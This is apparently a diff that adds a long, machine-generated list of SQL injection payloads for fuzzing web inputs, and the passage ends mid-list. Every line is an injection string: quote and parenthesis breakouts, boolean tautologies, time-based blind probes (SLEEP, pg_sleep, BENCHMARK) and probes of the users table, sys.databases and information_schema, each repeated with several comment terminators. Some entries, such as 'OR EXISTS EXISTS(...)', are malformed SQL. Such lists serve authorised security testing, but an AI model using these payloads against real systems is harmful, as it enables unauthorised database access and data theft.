+") OR NOT 1=1/**/
+") OR NOT 1=1
+") OR NOT 1=2--
+") OR NOT 1=2-- -
+") OR NOT 1=2#
+") OR NOT 1=2;%00
+") OR NOT 1=2/*
+") OR NOT 1=2/**/
+") OR NOT 1=2
+") OR NOT 'a'='a'--
+") OR NOT 'a'='a'-- -
+") OR NOT 'a'='a'#
+") OR NOT 'a'='a';%00
+") OR NOT 'a'='a'/*
+") OR NOT 'a'='a'/**/
+") OR NOT 'a'='a'
+") OR NOT 'x'='y'--
+") OR NOT 'x'='y'-- -
+") OR NOT 'x'='y'#
+") OR NOT 'x'='y';%00
+") OR NOT 'x'='y'/*
+") OR NOT 'x'='y'/**/
+") OR NOT 'x'='y'
+") OR NOT user()=user()--
+") OR NOT user()=user()-- -
+") OR NOT user()=user()#
+") OR NOT user()=user();%00
+") OR NOT user()=user()/*
+") OR NOT user()=user()/**/
+") OR NOT user()=user()
+") OR NOT version()=version()--
+") OR NOT version()=version()-- -
+") OR NOT version()=version()#
+") OR NOT version()=version();%00
+") OR NOT version()=version()/*
+") OR NOT version()=version()/**/
+") OR NOT version()=version()
+") OR NOT DATABASE()=DATABASE()--
+") OR NOT DATABASE()=DATABASE()-- -
+") OR NOT DATABASE()=DATABASE()#
+") OR NOT DATABASE()=DATABASE();%00
+") OR NOT DATABASE()=DATABASE()/*
+") OR NOT DATABASE()=DATABASE()/**/
+") OR NOT DATABASE()=DATABASE()
+") OR NOT (SELECT COUNT(*) FROM users)>0--
+") OR NOT (SELECT COUNT(*) FROM users)>0-- -
+") OR NOT (SELECT COUNT(*) FROM users)>0#
+") OR NOT (SELECT COUNT(*) FROM users)>0;%00
+") OR NOT (SELECT COUNT(*) FROM users)>0/*
+") OR NOT (SELECT COUNT(*) FROM users)>0/**/
+") OR NOT (SELECT COUNT(*) FROM users)>0
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR NOT SLEEP(2)--
+") OR NOT SLEEP(2)-- -
+") OR NOT SLEEP(2)#
+") OR NOT SLEEP(2);%00
+") OR NOT SLEEP(2)/*
+") OR NOT SLEEP(2)/**/
+") OR NOT SLEEP(2)
+") OR NOT SLEEP(5)--
+") OR NOT SLEEP(5)-- -
+") OR NOT SLEEP(5)#
+") OR NOT SLEEP(5);%00
+") OR NOT SLEEP(5)/*
+") OR NOT SLEEP(5)/**/
+") OR NOT SLEEP(5)
+") OR NOT BENCHMARK(100000,MD5(1))--
+") OR NOT BENCHMARK(100000,MD5(1))-- -
+") OR NOT BENCHMARK(100000,MD5(1))#
+") OR NOT BENCHMARK(100000,MD5(1));%00
+") OR NOT BENCHMARK(100000,MD5(1))/*
+") OR NOT BENCHMARK(100000,MD5(1))/**/
+") OR NOT BENCHMARK(100000,MD5(1))
+") OR NOT pg_sleep(2)--
+") OR NOT pg_sleep(2)-- -
+") OR NOT pg_sleep(2)#
+") OR NOT pg_sleep(2);%00
+") OR NOT pg_sleep(2)/*
+") OR NOT pg_sleep(2)/**/
+") OR NOT pg_sleep(2)
+") OR NOT pg_sleep(5)--
+") OR NOT pg_sleep(5)-- -
+") OR NOT pg_sleep(5)#
+") OR NOT pg_sleep(5);%00
+") OR NOT pg_sleep(5)/*
+") OR NOT pg_sleep(5)/**/
+") OR NOT pg_sleep(5)
+") OR NOT EXISTS(SELECT * FROM information_schema.tables)--
+") OR NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR NOT EXISTS(SELECT * FROM information_schema.tables)#
+") OR NOT EXISTS(SELECT * FROM information_schema.tables);%00
+") OR NOT EXISTS(SELECT * FROM information_schema.tables)/*
+") OR NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR NOT EXISTS(SELECT * FROM information_schema.tables)
+") AND NOT 1=1--
+") AND NOT 1=1-- -
+") AND NOT 1=1#
+") AND NOT 1=1;%00
+") AND NOT 1=1/*
+") AND NOT 1=1/**/
+") AND NOT 1=1
+") AND NOT 1=2--
+") AND NOT 1=2-- -
+") AND NOT 1=2#
+") AND NOT 1=2;%00
+") AND NOT 1=2/*
+") AND NOT 1=2/**/
+") AND NOT 1=2
+") AND NOT 'a'='a'--
+") AND NOT 'a'='a'-- -
+") AND NOT 'a'='a'#
+") AND NOT 'a'='a';%00
+") AND NOT 'a'='a'/*
+") AND NOT 'a'='a'/**/
+") AND NOT 'a'='a'
+") AND NOT 'x'='y'--
+") AND NOT 'x'='y'-- -
+") AND NOT 'x'='y'#
+") AND NOT 'x'='y';%00
+") AND NOT 'x'='y'/*
+") AND NOT 'x'='y'/**/
+") AND NOT 'x'='y'
+") AND NOT user()=user()--
+") AND NOT user()=user()-- -
+") AND NOT user()=user()#
+") AND NOT user()=user();%00
+") AND NOT user()=user()/*
+") AND NOT user()=user()/**/
+") AND NOT user()=user()
+") AND NOT version()=version()--
+") AND NOT version()=version()-- -
+") AND NOT version()=version()#
+") AND NOT version()=version();%00
+") AND NOT version()=version()/*
+") AND NOT version()=version()/**/
+") AND NOT version()=version()
+") AND NOT DATABASE()=DATABASE()--
+") AND NOT DATABASE()=DATABASE()-- -
+") AND NOT DATABASE()=DATABASE()#
+") AND NOT DATABASE()=DATABASE();%00
+") AND NOT DATABASE()=DATABASE()/*
+") AND NOT DATABASE()=DATABASE()/**/
+") AND NOT DATABASE()=DATABASE()
+") AND NOT (SELECT COUNT(*) FROM users)>0--
+") AND NOT (SELECT COUNT(*) FROM users)>0-- -
+") AND NOT (SELECT COUNT(*) FROM users)>0#
+") AND NOT (SELECT COUNT(*) FROM users)>0;%00
+") AND NOT (SELECT COUNT(*) FROM users)>0/*
+") AND NOT (SELECT COUNT(*) FROM users)>0/**/
+") AND NOT (SELECT COUNT(*) FROM users)>0
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") AND NOT SLEEP(2)--
+") AND NOT SLEEP(2)-- -
+") AND NOT SLEEP(2)#
+") AND NOT SLEEP(2);%00
+") AND NOT SLEEP(2)/*
+") AND NOT SLEEP(2)/**/
+") AND NOT SLEEP(2)
+") AND NOT SLEEP(5)--
+") AND NOT SLEEP(5)-- -
+") AND NOT SLEEP(5)#
+") AND NOT SLEEP(5);%00
+") AND NOT SLEEP(5)/*
+") AND NOT SLEEP(5)/**/
+") AND NOT SLEEP(5)
+") AND NOT BENCHMARK(100000,MD5(1))--
+") AND NOT BENCHMARK(100000,MD5(1))-- -
+") AND NOT BENCHMARK(100000,MD5(1))#
+") AND NOT BENCHMARK(100000,MD5(1));%00
+") AND NOT BENCHMARK(100000,MD5(1))/*
+") AND NOT BENCHMARK(100000,MD5(1))/**/
+") AND NOT BENCHMARK(100000,MD5(1))
+") AND NOT pg_sleep(2)--
+") AND NOT pg_sleep(2)-- -
+") AND NOT pg_sleep(2)#
+") AND NOT pg_sleep(2);%00
+") AND NOT pg_sleep(2)/*
+") AND NOT pg_sleep(2)/**/
+") AND NOT pg_sleep(2)
+") AND NOT pg_sleep(5)--
+") AND NOT pg_sleep(5)-- -
+") AND NOT pg_sleep(5)#
+") AND NOT pg_sleep(5);%00
+") AND NOT pg_sleep(5)/*
+") AND NOT pg_sleep(5)/**/
+") AND NOT pg_sleep(5)
+") AND NOT EXISTS(SELECT * FROM information_schema.tables)--
+") AND NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+") AND NOT EXISTS(SELECT * FROM information_schema.tables)#
+") AND NOT EXISTS(SELECT * FROM information_schema.tables);%00
+") AND NOT EXISTS(SELECT * FROM information_schema.tables)/*
+") AND NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+") AND NOT EXISTS(SELECT * FROM information_schema.tables)
+") OR EXISTS 1=1--
+") OR EXISTS 1=1-- -
+") OR EXISTS 1=1#
+") OR EXISTS 1=1;%00
+") OR EXISTS 1=1/*
+") OR EXISTS 1=1/**/
+") OR EXISTS 1=1
+") OR EXISTS 1=2--
+") OR EXISTS 1=2-- -
+") OR EXISTS 1=2#
+") OR EXISTS 1=2;%00
+") OR EXISTS 1=2/*
+") OR EXISTS 1=2/**/
+") OR EXISTS 1=2
+") OR EXISTS 'a'='a'--
+") OR EXISTS 'a'='a'-- -
+") OR EXISTS 'a'='a'#
+") OR EXISTS 'a'='a';%00
+") OR EXISTS 'a'='a'/*
+") OR EXISTS 'a'='a'/**/
+") OR EXISTS 'a'='a'
+") OR EXISTS 'x'='y'--
+") OR EXISTS 'x'='y'-- -
+") OR EXISTS 'x'='y'#
+") OR EXISTS 'x'='y';%00
+") OR EXISTS 'x'='y'/*
+") OR EXISTS 'x'='y'/**/
+") OR EXISTS 'x'='y'
+") OR EXISTS user()=user()--
+") OR EXISTS user()=user()-- -
+") OR EXISTS user()=user()#
+") OR EXISTS user()=user();%00
+") OR EXISTS user()=user()/*
+") OR EXISTS user()=user()/**/
+") OR EXISTS user()=user()
+") OR EXISTS version()=version()--
+") OR EXISTS version()=version()-- -
+") OR EXISTS version()=version()#
+") OR EXISTS version()=version();%00
+") OR EXISTS version()=version()/*
+") OR EXISTS version()=version()/**/
+") OR EXISTS version()=version()
+") OR EXISTS DATABASE()=DATABASE()--
+") OR EXISTS DATABASE()=DATABASE()-- -
+") OR EXISTS DATABASE()=DATABASE()#
+") OR EXISTS DATABASE()=DATABASE();%00
+") OR EXISTS DATABASE()=DATABASE()/*
+") OR EXISTS DATABASE()=DATABASE()/**/
+") OR EXISTS DATABASE()=DATABASE()
+") OR EXISTS (SELECT COUNT(*) FROM users)>0--
+") OR EXISTS (SELECT COUNT(*) FROM users)>0-- -
+") OR EXISTS (SELECT COUNT(*) FROM users)>0#
+") OR EXISTS (SELECT COUNT(*) FROM users)>0;%00
+") OR EXISTS (SELECT COUNT(*) FROM users)>0/*
+") OR EXISTS (SELECT COUNT(*) FROM users)>0/**/
+") OR EXISTS (SELECT COUNT(*) FROM users)>0
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR EXISTS SLEEP(2)--
+") OR EXISTS SLEEP(2)-- -
+") OR EXISTS SLEEP(2)#
+") OR EXISTS SLEEP(2);%00
+") OR EXISTS SLEEP(2)/*
+") OR EXISTS SLEEP(2)/**/
+") OR EXISTS SLEEP(2)
+") OR EXISTS SLEEP(5)--
+") OR EXISTS SLEEP(5)-- -
+") OR EXISTS SLEEP(5)#
+") OR EXISTS SLEEP(5);%00
+") OR EXISTS SLEEP(5)/*
+") OR EXISTS SLEEP(5)/**/
+") OR EXISTS SLEEP(5)
+") OR EXISTS BENCHMARK(100000,MD5(1))--
+") OR EXISTS BENCHMARK(100000,MD5(1))-- -
+") OR EXISTS BENCHMARK(100000,MD5(1))#
+") OR EXISTS BENCHMARK(100000,MD5(1));%00
+") OR EXISTS BENCHMARK(100000,MD5(1))/*
+") OR EXISTS BENCHMARK(100000,MD5(1))/**/
+") OR EXISTS BENCHMARK(100000,MD5(1))
+") OR EXISTS pg_sleep(2)--
+") OR EXISTS pg_sleep(2)-- -
+") OR EXISTS pg_sleep(2)#
+") OR EXISTS pg_sleep(2);%00
+") OR EXISTS pg_sleep(2)/*
+") OR EXISTS pg_sleep(2)/**/
+") OR EXISTS pg_sleep(2)
+") OR EXISTS pg_sleep(5)--
+") OR EXISTS pg_sleep(5)-- -
+") OR EXISTS pg_sleep(5)#
+") OR EXISTS pg_sleep(5);%00
+") OR EXISTS pg_sleep(5)/*
+") OR EXISTS pg_sleep(5)/**/
+") OR EXISTS pg_sleep(5)
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR EXISTS EXISTS(SELECT * FROM information_schema.tables)
+") AND EXISTS 1=1--
+") AND EXISTS 1=1-- -
+") AND EXISTS 1=1#
+") AND EXISTS 1=1;%00
+") AND EXISTS 1=1/*
+") AND EXISTS 1=1/**/
+") AND EXISTS 1=1
+") AND EXISTS 1=2--
+") AND EXISTS 1=2-- -
+") AND EXISTS 1=2#
+") AND EXISTS 1=2;%00
+") AND EXISTS 1=2/*
+") AND EXISTS 1=2/**/
+") AND EXISTS 1=2
+") AND EXISTS 'a'='a'--
+") AND EXISTS 'a'='a'-- -
+") AND EXISTS 'a'='a'#
+") AND EXISTS 'a'='a';%00
+") AND EXISTS 'a'='a'/*
+") AND EXISTS 'a'='a'/**/
+") AND EXISTS 'a'='a'
+") AND EXISTS 'x'='y'--
+") AND EXISTS 'x'='y'-- -
+") AND EXISTS 'x'='y'#
+") AND EXISTS 'x'='y';%00
+") AND EXISTS 'x'='y'/*
+") AND EXISTS 'x'='y'/**/
+") AND EXISTS 'x'='y'
+") AND EXISTS user()=user()--
+") AND EXISTS user()=user()-- -
+") AND EXISTS user()=user()#
+") AND EXISTS user()=user();%00
+") AND EXISTS user()=user()/*
+") AND EXISTS user()=user()/**/
+") AND EXISTS user()=user()
+") AND EXISTS version()=version()--
+") AND EXISTS version()=version()-- -
+") AND EXISTS version()=version()#
+") AND EXISTS version()=version();%00
+") AND EXISTS version()=version()/*
+") AND EXISTS version()=version()/**/
+") AND EXISTS version()=version()
+") AND EXISTS DATABASE()=DATABASE()--
+") AND EXISTS DATABASE()=DATABASE()-- -
+") AND EXISTS DATABASE()=DATABASE()#
+") AND EXISTS DATABASE()=DATABASE();%00
+") AND EXISTS DATABASE()=DATABASE()/*
+") AND EXISTS DATABASE()=DATABASE()/**/
+") AND EXISTS DATABASE()=DATABASE()
+") AND EXISTS (SELECT COUNT(*) FROM users)>0--
+") AND EXISTS (SELECT COUNT(*) FROM users)>0-- -
+") AND EXISTS (SELECT COUNT(*) FROM users)>0#
+") AND EXISTS (SELECT COUNT(*) FROM users)>0;%00
+") AND EXISTS (SELECT COUNT(*) FROM users)>0/*
+") AND EXISTS (SELECT COUNT(*) FROM users)>0/**/
+") AND EXISTS (SELECT COUNT(*) FROM users)>0
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") AND EXISTS SLEEP(2)--
+") AND EXISTS SLEEP(2)-- -
+") AND EXISTS SLEEP(2)#
+") AND EXISTS SLEEP(2);%00
+") AND EXISTS SLEEP(2)/*
+") AND EXISTS SLEEP(2)/**/
+") AND EXISTS SLEEP(2)
+") AND EXISTS SLEEP(5)--
+") AND EXISTS SLEEP(5)-- -
+") AND EXISTS SLEEP(5)#
+") AND EXISTS SLEEP(5);%00
+") AND EXISTS SLEEP(5)/*
+") AND EXISTS SLEEP(5)/**/
+") AND EXISTS SLEEP(5)
+") AND EXISTS BENCHMARK(100000,MD5(1))--
+") AND EXISTS BENCHMARK(100000,MD5(1))-- -
+") AND EXISTS BENCHMARK(100000,MD5(1))#
+") AND EXISTS BENCHMARK(100000,MD5(1));%00
+") AND EXISTS BENCHMARK(100000,MD5(1))/*
+") AND EXISTS BENCHMARK(100000,MD5(1))/**/
+") AND EXISTS BENCHMARK(100000,MD5(1))
+") AND EXISTS pg_sleep(2)--
+") AND EXISTS pg_sleep(2)-- -
+") AND EXISTS pg_sleep(2)#
+") AND EXISTS pg_sleep(2);%00
+") AND EXISTS pg_sleep(2)/*
+") AND EXISTS pg_sleep(2)/**/
+") AND EXISTS pg_sleep(2)
+") AND EXISTS pg_sleep(5)--
+") AND EXISTS pg_sleep(5)-- -
+") AND EXISTS pg_sleep(5)#
+") AND EXISTS pg_sleep(5);%00
+") AND EXISTS pg_sleep(5)/*
+") AND EXISTS pg_sleep(5)/**/
+") AND EXISTS pg_sleep(5)
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+") AND EXISTS EXISTS(SELECT * FROM information_schema.tables)
+' OR (' OR 1=1--
+' OR (' OR 1=1-- -
+' OR (' OR 1=1#
+' OR (' OR 1=1;%00
+' OR (' OR 1=1/*
+' OR (' OR 1=1/**/
+' OR (' OR 1=1
+' OR (' OR 1=2--
+' OR (' OR 1=2-- -
+' OR (' OR 1=2#
+' OR (' OR 1=2;%00
+' OR (' OR 1=2/*
+' OR (' OR 1=2/**/
+' OR (' OR 1=2
+' OR (' OR 'a'='a'--
+' OR (' OR 'a'='a'-- -
+' OR (' OR 'a'='a'#
+' OR (' OR 'a'='a';%00
+' OR (' OR 'a'='a'/*
+' OR (' OR 'a'='a'/**/
+' OR (' OR 'a'='a'
+' OR (' OR 'x'='y'--
+' OR (' OR 'x'='y'-- -
+' OR (' OR 'x'='y'#
+' OR (' OR 'x'='y';%00
+' OR (' OR 'x'='y'/*
+' OR (' OR 'x'='y'/**/
+' OR (' OR 'x'='y'
+' OR (' OR user()=user()--
+' OR (' OR user()=user()-- -
+' OR (' OR user()=user()#
+' OR (' OR user()=user();%00
+' OR (' OR user()=user()/*
+' OR (' OR user()=user()/**/
+' OR (' OR user()=user()
+' OR (' OR version()=version()--
+' OR (' OR version()=version()-- -
+' OR (' OR version()=version()#
+' OR (' OR version()=version();%00
+' OR (' OR version()=version()/*
+' OR (' OR version()=version()/**/
+' OR (' OR version()=version()
+' OR (' OR DATABASE()=DATABASE()--
+' OR (' OR DATABASE()=DATABASE()-- -
+' OR (' OR DATABASE()=DATABASE()#
+' OR (' OR DATABASE()=DATABASE();%00
+' OR (' OR DATABASE()=DATABASE()/*
+' OR (' OR DATABASE()=DATABASE()/**/
+' OR (' OR DATABASE()=DATABASE()
+' OR (' OR (SELECT COUNT(*) FROM users)>0--
+' OR (' OR (SELECT COUNT(*) FROM users)>0-- -
+' OR (' OR (SELECT COUNT(*) FROM users)>0#
+' OR (' OR (SELECT COUNT(*) FROM users)>0;%00
+' OR (' OR (SELECT COUNT(*) FROM users)>0/*
+' OR (' OR (SELECT COUNT(*) FROM users)>0/**/
+' OR (' OR (SELECT COUNT(*) FROM users)>0
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (' OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR (' OR SLEEP(2)--
+' OR (' OR SLEEP(2)-- -
+' OR (' OR SLEEP(2)#
+' OR (' OR SLEEP(2);%00
+' OR (' OR SLEEP(2)/*
+' OR (' OR SLEEP(2)/**/
+' OR (' OR SLEEP(2)
+' OR (' OR SLEEP(5)--
+' OR (' OR SLEEP(5)-- -
+' OR (' OR SLEEP(5)#
+' OR (' OR SLEEP(5);%00
+' OR (' OR SLEEP(5)/*
+' OR (' OR SLEEP(5)/**/
+' OR (' OR SLEEP(5)
+' OR (' OR BENCHMARK(100000,MD5(1))--
+' OR (' OR BENCHMARK(100000,MD5(1))-- -
+' OR (' OR BENCHMARK(100000,MD5(1))#
+' OR (' OR BENCHMARK(100000,MD5(1));%00
+' OR (' OR BENCHMARK(100000,MD5(1))/*
+' OR (' OR BENCHMARK(100000,MD5(1))/**/
+' OR (' OR BENCHMARK(100000,MD5(1))
+' OR (' OR pg_sleep(2)--
+' OR (' OR pg_sleep(2)-- -
+' OR (' OR pg_sleep(2)#
+' OR (' OR pg_sleep(2);%00
+' OR (' OR pg_sleep(2)/*
+' OR (' OR pg_sleep(2)/**/
+' OR (' OR pg_sleep(2)
+' OR (' OR pg_sleep(5)--
+' OR (' OR pg_sleep(5)-- -
+' OR (' OR pg_sleep(5)#
+' OR (' OR pg_sleep(5);%00
+' OR (' OR pg_sleep(5)/*
+' OR (' OR pg_sleep(5)/**/
+' OR (' OR pg_sleep(5)
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables)--
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables)#
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables);%00
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables)/*
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR (' OR EXISTS(SELECT * FROM information_schema.tables)
+' OR (' AND 1=1--
+' OR (' AND 1=1-- -
+' OR (' AND 1=1#
+' OR (' AND 1=1;%00
+' OR (' AND 1=1/*
+' OR (' AND 1=1/**/
+' OR (' AND 1=1
+' OR (' AND 1=2--
+' OR (' AND 1=2-- -
+' OR (' AND 1=2#
+' OR (' AND 1=2;%00
+' OR (' AND 1=2/*
+' OR (' AND 1=2/**/
+' OR (' AND 1=2
+' OR (' AND 'a'='a'--
+' OR (' AND 'a'='a'-- -
+' OR (' AND 'a'='a'#
+' OR (' AND 'a'='a';%00
+' OR (' AND 'a'='a'/*
+' OR (' AND 'a'='a'/**/
+' OR (' AND 'a'='a'
+' OR (' AND 'x'='y'--
+' OR (' AND 'x'='y'-- -
+' OR (' AND 'x'='y'#
+' OR (' AND 'x'='y';%00
+' OR (' AND 'x'='y'/*
+' OR (' AND 'x'='y'/**/
+' OR (' AND 'x'='y'
+' OR (' AND user()=user()--
+' OR (' AND user()=user()-- -
+' OR (' AND user()=user()#
+' OR (' AND user()=user();%00
+' OR (' AND user()=user()/*
+' OR (' AND user()=user()/**/
+' OR (' AND user()=user()
+' OR (' AND version()=version()--
+' OR (' AND version()=version()-- -
+' OR (' AND version()=version()#
+' OR (' AND version()=version();%00
+' OR (' AND version()=version()/*
+' OR (' AND version()=version()/**/
+' OR (' AND version()=version()
+' OR (' AND DATABASE()=DATABASE()--
+' OR (' AND DATABASE()=DATABASE()-- -
+' OR (' AND DATABASE()=DATABASE()#
+' OR (' AND DATABASE()=DATABASE();%00
+' OR (' AND DATABASE()=DATABASE()/*
+' OR (' AND DATABASE()=DATABASE()/**/
+' OR (' AND DATABASE()=DATABASE()
+' OR (' AND (SELECT COUNT(*) FROM users)>0--
+' OR (' AND (SELECT COUNT(*) FROM users)>0-- -
+' OR (' AND (SELECT COUNT(*) FROM users)>0#
+' OR (' AND (SELECT COUNT(*) FROM users)>0;%00
+' OR (' AND (SELECT COUNT(*) FROM users)>0/*
+' OR (' AND (SELECT COUNT(*) FROM users)>0/**/
+' OR (' AND (SELECT COUNT(*) FROM users)>0
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR (' AND SLEEP(2)--
+' OR (' AND SLEEP(2)-- -
+' OR (' AND SLEEP(2)#
+' OR (' AND SLEEP(2);%00
+' OR (' AND SLEEP(2)/*
+' OR (' AND SLEEP(2)/**/
+' OR (' AND SLEEP(2)
+' OR (' AND SLEEP(5)--
+' OR (' AND SLEEP(5)-- -
+' OR (' AND SLEEP(5)#
+' OR (' AND SLEEP(5);%00
+' OR (' AND SLEEP(5)/*
+' OR (' AND SLEEP(5)/**/
+' OR (' AND SLEEP(5)
+' OR (' AND BENCHMARK(100000,MD5(1))--
+' OR (' AND BENCHMARK(100000,MD5(1))-- -
+' OR (' AND BENCHMARK(100000,MD5(1))#
+' OR (' AND BENCHMARK(100000,MD5(1));%00
+' OR (' AND BENCHMARK(100000,MD5(1))/*
+' OR (' AND BENCHMARK(100000,MD5(1))/**/
+' OR (' AND BENCHMARK(100000,MD5(1))
+' OR (' AND pg_sleep(2)--
+' OR (' AND pg_sleep(2)-- -
+' OR (' AND pg_sleep(2)#
+' OR (' AND pg_sleep(2);%00
+' OR (' AND pg_sleep(2)/*
+' OR (' AND pg_sleep(2)/**/
+' OR (' AND pg_sleep(2)
+' OR (' AND pg_sleep(5)--
+' OR (' AND pg_sleep(5)-- -
+' OR (' AND pg_sleep(5)#
+' OR (' AND pg_sleep(5);%00
+' OR (' AND pg_sleep(5)/*
+' OR (' AND pg_sleep(5)/**/
+' OR (' AND pg_sleep(5)
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables)--
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables)#
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables);%00
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables)/*
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR (' AND EXISTS(SELECT * FROM information_schema.tables)
+' OR (' OR NOT 1=1--
+' OR (' OR NOT 1=1-- -
+' OR (' OR NOT 1=1#
+' OR (' OR NOT 1=1;%00
+' OR (' OR NOT 1=1/*
+' OR (' OR NOT 1=1/**/
+' OR (' OR NOT 1=1
+' OR (' OR NOT 1=2--
+' OR (' OR NOT 1=2-- -
+' OR (' OR NOT 1=2#
+' OR (' OR NOT 1=2;%00
+' OR (' OR NOT 1=2/*
+' OR (' OR NOT 1=2/**/
+' OR (' OR NOT 1=2
+' OR (' OR NOT 'a'='a'--
+' OR (' OR NOT 'a'='a'-- -
+' OR (' OR NOT 'a'='a'#
+' OR (' OR NOT 'a'='a';%00
+' OR (' OR NOT 'a'='a'/*
+' OR (' OR NOT 'a'='a'/**/
+' OR (' OR NOT 'a'='a'
+' OR (' OR NOT 'x'='y'--
+' OR (' OR NOT 'x'='y'-- -
+' OR (' OR NOT 'x'='y'#
+' OR (' OR NOT 'x'='y';%00
+' OR (' OR NOT 'x'='y'/*
+' OR (' OR NOT 'x'='y'/**/
+' OR (' OR NOT 'x'='y'
+' OR (' OR NOT user()=user()--
+' OR (' OR NOT user()=user()-- -
+' OR (' OR NOT user()=user()#
+' OR (' OR NOT user()=user();%00
+' OR (' OR NOT user()=user()/*
+' OR (' OR NOT user()=user()/**/
+' OR (' OR NOT user()=user()
+' OR (' OR NOT version()=version()--
+' OR (' OR NOT version()=version()-- -
+' OR (' OR NOT version()=version()#
+' OR (' OR NOT version()=version();%00
+' OR (' OR NOT version()=version()/*
+' OR (' OR NOT version()=version()/**/
+' OR (' OR NOT version()=version()
+' OR (' OR NOT DATABASE()=DATABASE()--
+' OR (' OR NOT DATABASE()=DATABASE()-- -
+' OR (' OR NOT DATABASE()=DATABASE()#
+' OR (' OR NOT DATABASE()=DATABASE();%00
+' OR (' OR NOT DATABASE()=DATABASE()/*
+' OR (' OR NOT DATABASE()=DATABASE()/**/
+' OR (' OR NOT DATABASE()=DATABASE()
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0--
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0-- -
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0#
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0;%00
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0/*
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0/**/
+' OR (' OR NOT (SELECT COUNT(*) FROM users)>0
+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
